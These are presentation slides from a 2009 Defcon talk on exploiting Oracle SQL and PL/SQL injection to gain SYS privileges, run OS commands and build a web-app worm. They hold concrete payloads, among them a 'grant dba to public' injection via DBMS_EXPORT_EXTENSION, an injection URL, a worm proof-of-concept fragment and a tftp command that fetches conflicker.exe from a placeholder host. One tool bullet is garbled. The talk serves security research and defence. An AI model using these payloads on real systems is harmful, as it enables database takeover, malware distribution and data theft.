# The Making of the Second SQL Injection Worm (Oracle Edition)

## Presenter: Sumit Siddharth
- **Email:** PI:EMAIL
- **Website:** [www.notsosecure.com](http://www.notsosecure.com)
- **Event:** Defcon 17, Las Vegas, July 2009

---

## About Me:
- **Role:** Senior IT Security Consultant
- **Experience:** Over 4 years in Penetration Testing
- **Note:** Not an Oracle expert :(
- **Blog:** [www.notsosecure.com](http://www.notsosecure.com)
- **Presentation Structure:** 10 slides + 2 demos = 20 minutes

---

## Agenda
- Exploiting SQL Injections in web applications with an Oracle backend to achieve:
  - Privilege escalation from the session user to SYS (similar to openrowset hacks in MS SQL).
  - Execution of OS commands and file system read/write access (like xp_cmdshell in MS SQL).
  - Targeting Oracle web apps with worms (as seen with MS SQL).

---

## Oracle: How Things Work
- **Default Configuration:** Oracle comes with many stored procedures and functions.
- **Privileges:** Most functions and stored procedures run with definer privileges (default).
- **Current User Privileges:** To make a function execute with the privileges of the user, it must include the 'authid current_user' keyword.
- **Exploitation:** If you find a SQL (PL/SQL) injection in a function owned by SYS and with 'authid definer', you can run SQL (PL/SQL) as SYS.

---

## SQL Injection in Oracle
- **PL/SQL Injection:**
  - **Injection Type:** Anonymous PL/SQL block
  - **Restrictions:** None
  - **Capabilities:** Execute DDL and DML statements
  - **Ease of Exploitation:** Easy
  - **Example:** 
    ```sql
    create or replace procedure orasso.test (q IN varchar2) AS
    BEGIN
      execute immediate ('begin '||q||'; end;');
    END;
    ```
    - **Attack Limitation:** None
    - **Execution:** Can execute multiple statements, e.g., `q=>null;execute immediate 'grant dba to public';end'--`

- **SQL Injection:**
  - **Injection Type:** Single SQL statement
  - **Restrictions:** No semicolon allowed
  - **Capabilities:** Limited
  - **Ease of Exploitation:** Difficult

---

## PL/SQL Injection from Web Apps
- **Vulnerability:** A vulnerable Oracle Application server allows PL/SQL injection.
- **Bypassing Exclusion List:**
  - Example: `http://host:7777/pls/orasso/orasso.home?);execute+immediate+:1;--={PL/SQL}`
- **Permissions:** Execute PL/SQL with the permissions of the user described in 'DAD' (e.g., orasso_public).
- **Exploitation:** Use vulnerable procedures to become a DBA.
- **Examples:**
  - `LT.COMPRESSWORKSPACETREE` (CPU Oct 2008; milw0rm:7677)
  - `LT.FINDRICSET` (CPU October 2007; milw0rm:4572)
- **OS Code Execution:** Prefer Java for executing OS code.

---

## Hacking OAS with OAP_Hacker.pl
- **Tool:** OAP_hacker.pl
- **Features:**
  - Supports O.A.S c:\dir.txt')--
  - Exploits functions vulnerable to PL/SQL injection.
  - **Authid=definer:** Execute PL/SQL with definer privileges.
  - **Authid=current_user:** Execute PL/SQL and exploit vulnerable packages.
  - **Privilege Escalation:** Become a DBA.
  - **OS Code Execution:** Execute OS code.

---

## Introducing Dbms_Export_Extension
- **Package:** An Oracle package with several functions and procedures vulnerable to PL/SQL injections, allowing privilege escalation.
- **Vulnerable Function:** `GET_DOMAIN_INDEX_TABLES()`
  - **Owner:** SYS
  - **Execution:** Runs as SYS
  - **Injection Point:** Can be called from SQL queries like SELECT, INSERT, UPDATE, etc.
- **Function Definition:**
  ```sql
  FUNCTION GET_DOMAIN_INDEX_TABLES ( INDEX_NAME IN VARCHAR2, INDEX_SCHEMA IN VARCHAR2, TYPE_NAME IN VARCHAR2, TYPE_SCHEMA IN VARCHAR2, READ_ONLY IN PLS_INTEGER, VERSION IN VARCHAR2, GET_TABLES IN PLS_INTEGER) 
  RETURN VARCHAR2 IS 
  BEGIN 
    [...]
    STMTSTRING := 'BEGIN ' || '"' || TYPE_SCHEMA || '"."' || TYPE_NAME || 
      '".ODCIIndexUtilCleanup(:p1); ' || 'END;';
    DBMS_SQL.PARSE(CRS, STMTSTRING, DBMS_SYS_SQL.V7); 
    DBMS_SQL.BIND_VARIABLE(CRS,':p1',GETTABLENAMES_CONTEXT); 
    [...]
  END GET_DOMAIN_INDEX_TABLES;
  ```

---

## Example
- **Query:**
  ```sql
  select 
  SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '''' grant dba to public'''';END;'';END;-- ','SYS',0,'1',0) from dual
  ```
- **Fix:** Fixed in CPU April 2006.
- **Vulnerable Versions:**
  - Oracle 8.1.7.4
  - 9.2.0.1 - 9.2.0.7
  - 10.1.0.2 - 10.1.0.4
  - 10.2.0.1-10.2.0.2
  - XE

---

## Bsqlbf v2.3
- **Exploit Capabilities:**
  - **Privilege Escalation (Type 3)**
  - **OS Code Execution (Type 4):**
    - Default: Java (stype 0)
    - Oracle 9: `plsql_native_make_utility` (stype 1)
    - Oracle 10: `dbms_scheduler` (stype 2)
  - **File System Read/Write Access (Type 5):** Java only
- **Demo:** Available at [www.notsosecure.com](http://www.notsosecure.com)

---

## SQL Injection Worms
- **MS-SQL:**
  - Example: `s=290';DECLARE%20@S...`
- **Oracle:**
  - Example: `http://127.0.0.1:81/ora4.php?name=1 and 1=(select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '''' begin execute immediate '''''''' alter session set current_schema=SCOTT ''''''''; execute immediate ''''''''commit'''''''';for rec in (select chr(117)||chr(112)...`

---

## What Could the Worm Do?
- **Database Table Updates:** Modify certain database tables.
- **Malware Distribution:** The website starts distributing malware.
- **Browser Exploits:** Pwn legitimate users with browser exploits (e.g., IE 0-days).
- **OS Code Execution:** Distribute other worms like Conflicker.
  - Example: `select LinxRunCmd('tftp -i x.x.x.x GET conflicker.exe') from dual`
- **Internal Network Exploits:**
  - Oracle Secure Backup: Remote Command Injection (CPU 2009)
  - SQL Injection in Oracle Enterprise Manager (CPU 2009)
  - TNS Listener exploits (milw0rm: 8507)
- **Other Activities:** Many other potential actions.

---

## Demos
- **Demo 1:** Hacking OAS with OAS_hacker.pl
- **Demo 2:** Privilege escalation; extracting data with SYS privileges (visit [www.notsosecure.com](http://www.notsosecure.com))
- **Demo 3:** OS code execution with Java (at [www.notsosecure.com](http://www.notsosecure.com))
- **Demo 4:** Proof of Concept for a potential Oracle SQL Injection worm

---

## Thank You
- **References:**
  - [Red Database Security: Oracle SQL Injection](http://www.red-database-security.com/exploits/oracle_sql_injection_oracle_kupw$worker2.html)
  - [Breach Security Labs: Oracle Application Server Alert](http://www.breach.com/resources/breach-security-labs/alerts/breach-security-labs-releases-alert-on-oracle-application-se)
  - [OWASP: Testing for Oracle](http://www.owasp.org/index.php/Testing_for_Oracle)
  - [Google Oracle Hacking US](http://www.red-database-security.com/wp/google_oracle_hacking_us.pdf)
  - [Black Hat USA 2005: Oracle Hacking](http://www.blackhat.com/presentations/bh-usa-05/bh-us-05-fayo.pdf)
  - And many more...

---

Thank you for your attention!